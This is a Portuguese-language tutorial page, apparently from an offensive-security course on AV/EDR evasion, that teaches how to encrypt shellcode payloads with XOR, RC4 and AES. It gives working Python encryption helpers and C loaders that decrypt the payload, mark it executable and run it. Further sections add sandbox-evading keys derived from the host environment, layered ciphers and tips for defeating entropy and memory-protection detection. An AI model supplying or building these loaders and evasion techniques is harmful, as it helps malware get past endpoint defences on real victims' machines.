---
layout: cyber
section: evasao
title: "Payload Encryption (XOR / RC4 / AES)"
---

# 11. Payload Encryption (XOR / RC4 / AES)

## Cifra Elimina Assinatura Estática

Shellcode em claro tem assinatura estática conhecida — msfvenom stagers, beacon templates Cobalt Strike, padrões msf-pattern. Criptografar payload elimina string-based detection e força AV/EDR a depender de heurística runtime. Trade-off: entropia da seção sobe (texto cifrado parece random), e isso por si só dispara ML. Solução: combinar com placement em `.rsrc` ou `.data` pra reduzir suspeita.

---

## Trade-offs entre XOR, RC4 e AES

Três opções principais em ordem crescente de strength e overhead:

| Cifra | Key size | Overhead | Detecção da rotina |
|-------|---------|----------|--------------------|
| XOR (single-byte ou multi-byte) | 1-256 bytes | Mínimo (~10 instructions) | Trivial — assinatura xor loop conhecida |
| RC4 | 5-256 bytes | Médio (KSA + PRGA) | Detectável (RC4 KSA tem padrão) |
| AES (CBC ou CTR) | 128/256 bits | Alto (precisa CNG ou implementação custom) | Baixa — uso legítimo amplo |

---

## Na Prática

### 1. XOR Encryption

#### Encrypt-time (Python helper):

```python
def xor_encrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

with open("payload.bin", "rb") as f:
    payload = f.read()

key = b"SuperSecret123"
encrypted = xor_encrypt(payload, key)

# Output C array
print("unsigned char Payload[] = { " + ", ".join(f"0x{b:02x}" for b in encrypted) + " };")
print(f'char Key[] = "{key.decode()}";')
```

#### Decrypt-runtime (C):

```c
void XorDecrypt(PBYTE pData, SIZE_T sSize, PBYTE pKey, SIZE_T sKeyLen) {
    for (SIZE_T i = 0; i < sSize; i++)
        pData[i] ^= pKey[i % sKeyLen];
}

int main() {
    DWORD dwOld;
    VirtualProtect(Payload, sizeof(Payload), PAGE_READWRITE, &dwOld);
    XorDecrypt(Payload, sizeof(Payload), (PBYTE)Key, strlen(Key));
    VirtualProtect(Payload, sizeof(Payload), PAGE_EXECUTE_READ, &dwOld);
    ((void(*)())Payload)();
}
```

**Limitação**: assinatura de XOR loop é trivial. Yara detecta pattern de `XOR reg, reg / loop`.

### 2. RC4 Encryption (via SystemFunction032)

Windows expõe RC4 via `SystemFunction032` em `advapi32.dll` (ou `cryptbase.dll`). API não-documentada mas estável.

```c
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (NTAPI *SystemFunction032_t)(USTRING* data, USTRING* key);

void Rc4DecryptInPlace(PBYTE pData, SIZE_T sSize, PBYTE pKey, SIZE_T sKeyLen) {
    USTRING data = { sSize, sSize, pData };
    USTRING key  = { sKeyLen, sKeyLen, pKey };

    SystemFunction032_t pRc4 = (SystemFunction032_t)GetProcAddress(
        LoadLibraryA("advapi32"), "SystemFunction032");
    pRc4(&data, &key);  // In-place RC4
}
```

**Vantagem**: chamada de API legítima — não tem loop XOR explícito no código.

### 3. AES Encryption (via CNG / BCrypt)

Windows fornece AES via Cryptography Next Generation (CNG).

#### Encrypt-time (gerar ciphertext + IV — Python via `cryptography`):

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

key = os.urandom(32)  # AES-256
iv = os.urandom(16)
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
encryptor = cipher.encryptor()

# Pad para múltiplo de 16
padded = payload + b"\x00" * (16 - len(payload) % 16)
ct = encryptor.update(padded) + encryptor.finalize()
# Embeddar key + iv + ct no binário
```

#### Decrypt-runtime (C com BCrypt):

```c
#include <bcrypt.h>
#pragma comment(lib, "bcrypt")

NTSTATUS AesDecrypt(PBYTE pCipher, DWORD dwCipherSize, PBYTE pKey, PBYTE pIV) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD dwResult;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);

    BCryptDecrypt(hKey, pCipher, dwCipherSize, NULL,
                  pIV, 16, pCipher, dwCipherSize, &dwResult, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}
```

**Vantagem**: API CNG usada por software legítimo o tempo todo (TLS, BitLocker, etc.). EDR não pode bloquear.

---

## Pattern Avançado — Key Derivation From Environment

Em vez de embeddar key no binário (cargo-cult), derivar key de propriedade do ambiente. Se executar em sandbox, key não bate → decrypt falha → binário aparenta inerte.

```c
// Key derivada de: domain SID + hostname + username
char szBuf[256];
DWORD dwLen = sizeof(szBuf);
GetComputerNameA(szBuf, &dwLen);

// SHA256(szBuf) = AES key
// Sandbox tem hostname diferente → key diferente → garbage output
```

Veja DRM-equipped malware (`14_drm_equipped_malware.md`).

---

## Combinando Cifras (Defense in Depth)

```
[ payload bruto ] → XOR → RC4 → AES → embed em .rsrc
```

Cada camada exige sua key correta. Defeat por:
- Static analysis: vê só blob random.
- Sandbox detonation: precisa rodar até o end + key correta.
- Strings extraction: nenhuma string utilizável.

---

## Custom Encryption — IPv4/UUID Encoding

Veja `12_payload_obfuscation_data_encoding.md` para representação de shellcode como strings IPv4 / MAC / UUID — útil quando precisa esconder bytes em formato legítimo (config files, registry strings).

---

## Detecção

- **Entropia por seção**: payload encriptado em `.text` tem entropia 7.5+ vs código normal 5-6. Defender ML detecta.
  - **Mitigação**: payload em `.rsrc` (resources têm entropia variável legítima).
- **Decrypt loops em runtime**: hooks em `VirtualProtect` RW→RX flagam memória que muda de criptografada para executável.
  - **Mitigação**: usar `VirtualAlloc` separado para destino limpo + scratch buffer.
- **CNG / BCrypt calls com payload sized buffers**: telemetria ETW.
  - **Mitigação**: implementação AES self-contained (sem chamar BCrypt).

## Leitura Complementar

- WBenny — Demystifying CNG — https://github.com/wbenny/notes
- MITRE ATT&CK T1027.013 — Encrypted/Encoded File
